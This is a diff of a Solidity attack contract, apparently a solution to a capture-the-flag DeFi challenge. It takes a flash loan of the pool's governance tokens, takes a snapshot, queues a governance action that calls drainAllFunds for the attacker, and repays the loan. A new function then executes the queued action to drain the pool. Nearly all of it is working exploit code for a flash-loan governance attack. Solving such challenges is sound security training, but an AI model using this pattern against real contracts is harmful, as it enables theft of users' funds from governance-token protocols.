@@ -57,9 +57,6 @@ contract FlashLoanReceiver {
         assert(everything == 1_500_000e18);
         // And flashloan it
         _selfiePool.flashLoan(everything);
-
-        if (_dvtSnap.balanceOf(address(this)) != everything)
-            revert CallFailed();
     }
 
     function receiveTokens(address token, uint256 amount) external {
@@ -69,16 +66,19 @@ contract FlashLoanReceiver {
             "drainAllFunds(address)",
             _attacker
         );
+        // Create a snapshot to ensure snap id increments
+        _dvtSnap.snapshot();
         // Into its governance
-        if (
-            _simpleGovernance.queueAction(
-                address(_selfiePool),
-                evilPayload,
-                0
-            ) == 0
-        ) revert CallFailed();
+
+        _simpleGovernance.queueAction(address(_selfiePool), evilPayload, 0);
 
         // And you refund the pool
         _dvtSnap.transfer(address(_selfiePool), amount);
+    }
+
+    function drainAllFunds() external {
+        if (msg.sender != _attacker) revert SenderIsNotOwner();
+        //Then you drain all funds
+        _simpleGovernance.executeAction(1);
     }
 }
